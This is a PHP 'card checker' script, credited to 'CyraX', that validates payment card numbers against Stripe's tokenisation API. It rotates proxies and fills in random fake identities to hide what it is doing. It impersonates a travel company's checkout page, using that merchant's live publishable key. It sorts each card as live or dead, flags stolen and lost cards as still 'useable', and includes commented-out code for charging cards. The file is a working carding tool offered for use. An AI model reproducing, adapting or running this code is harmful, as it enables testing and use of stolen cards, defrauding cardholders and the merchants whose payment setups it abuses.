<?php

///////////////BASE BY CYRAX////////////////////

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function proxys() 
{
  $poxyHttps = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxyHttps) - 1);
  $poxyHttps = $poxyHttps[$myproxy];
  return $poxyHttps;
}
$proxy = proxys(); 
$ip = multiexplode(array(":", "|", ""), $proxy)[0]; 
'<span class="badge badge-danger">「 IP: '.$ip.' 」</span>';
////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

//$username = 'Put Zone Username Here';
//$password = 'Put Zone Password Here';
//$port = 22225;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[1st Req]
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4); //uncomment to use proxy.txt
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json', 
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/m/v3/index-08530579fdb5229c50cc57d0adf3263c.html?distinct_id=cfec0fbe-9411-a312-4835-4c6fc10805e5',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email=wwakglwag%40yahoo.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2F8ab9a2f)&referrer=https%3A%2F%2Fwww.executivetravelsolutions.ie%2Fasp-products%2Fmake-a-payment%2F&pasted_fields=cvc%2Cnumber&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=awhawh&card[address_line1]=awhawhaw&card[address_city]=12gawgaw&card[address_zip]=6216&card[address_country]=Philippines&time_on_page=50035&guid=dd598bd6-34bb-4f92-9371-1b71d9a23a67&muid=38008ca0-0027-4bc7-9961-e62e7db56f27&sid=303f678c-9b09-46d3-a9ee-636594db4b95&key=pk_live_B0ZptN27NgIKEIPlqmlFwfN8');

$result = curl_exec($ch);
//$token = trim(strip_tags(getStr($result1,'"id": "','"')));

////Uncomment this section for using 2req////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

//  $ch = curl_init();

// //curl_setopt($ch, CURLOPT_PROXY, $poxySocks4); Uncomment to use proxy.txt
//  curl_setopt($ch, CURLOPT_URL, '#');
//  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//    'accept: application/json, text/javascript, */*; q=0.01',
//    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
//   // 'cookie: ',   
//    'Origin: #',
//    'referer: #',
//    'Sec-Fetch-Mode: cors',
// //'X-Requested-With: XMLHttpRequest',
//  ));
//  curl_setopt($ch, CURLOPT_POSTFIELDS, '#');

//  $result = curl_exec($ch);
 

////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">Live✓</span>' . $lista . '<span class="badge badge-success"> CVV:Matched 🍌 </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">Live✓</span>' . $lista . '</span> <span class="badge badge-success"> CCN:Matched 🍌 </span></br>';
}
elseif(strpos($result, 'Your card security code is incorrect.' )) {
  echo '<span class="badge badge-success">Live✓</span>' . $lista . '</span> <span class="badge badge-success"> CCN:Matched 🍌 </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">Live✓ </span>' . $lista . '</span> <span class="badge badge-success"> CCN:Matched 🍌 </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">Live✓</span>' . $lista . '</span> <span class="badge badge-success"> CCN:Matched 🍌 - Incorrect Zip </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">Live✓</span>' . $lista . '</span> <span class="badge badge-success"> STOLEN:Card 🍌 </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">Live✓</span>' . $lista . '</span> <span class="badge badge-success"> LOST:Card 🍌</span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">Live</span>' . $lista . '</span> <span class="badge badge-success"> Insufficient:Funds 🍌  </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="badge badge-danger">Dead X </span>' . $lista . '</span> <span class="badge badge-danger"> CARD:Expired 🍌</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">Live✓</span>' . $lista . '</span></span> <span class="badge badge-danger"> PICKUP:Card 🍌 - Sometime Useable </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="badge badge-danger">Dead❌ </span>' . $lista . '</span> <span class="badge badge-danger"> INCORRECT:Card Number 🍌 </span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="badge badge-danger">Dead❌ ❌ </span>' . $lista . '</span> <span class="badge badge-danger"> INCORRECT:Card Number 🍌 </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="badge badge-danger">Dead❌ </span>' . $lista . '</span> <span class="badge badge-danger"> CARD:Declined 🍌</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="badge badge-danger">Dead❌ </span>' . $lista . '</span> <span class="badge badge-danger"> CARD:Generic_Decline 🍌 </span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="badge badge-danger">Dead❌ </span>' . $lista . '</span> <span class="badge badge-danger">  CARD:Do_Not_Honor 🍌 </span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="badge badge-danger">Dead❌ </span>' . $lista . '</span> <span class="badge badge-danger"> CVC:Unchecked Change Site 🍌 [Proxy Dead] </span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="badge badge-danger">Dead❌ </span>' . $lista . '</span> <span class="badge badge-danger"> CVV:Check_fail 🍌 </span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="badge badge-danger">Dead❌ </span> ' . $lista . '</span> <span class="badge badge-danger"> CARD:Expired 🍌</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-danger">Dead❌ </span>' . $lista . '</span> <span class="badge badge-danger"> CARD:Doesnt Support This Purchase 🍌 </span> </br>';
}
 else {
  echo '<span class="badge badge-danger">Dead❌ </span>' . $lista . '</span> <span class="badge badge-danger"> PROXY:Dead 🍌</span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
// echo $result
//echo $token; to check if token captured or not 

///////////////////////////////////////////////====== By CyraX===============\\\\\\\\\\\\\\\[Used Reboot13 Raw Base ]
?>
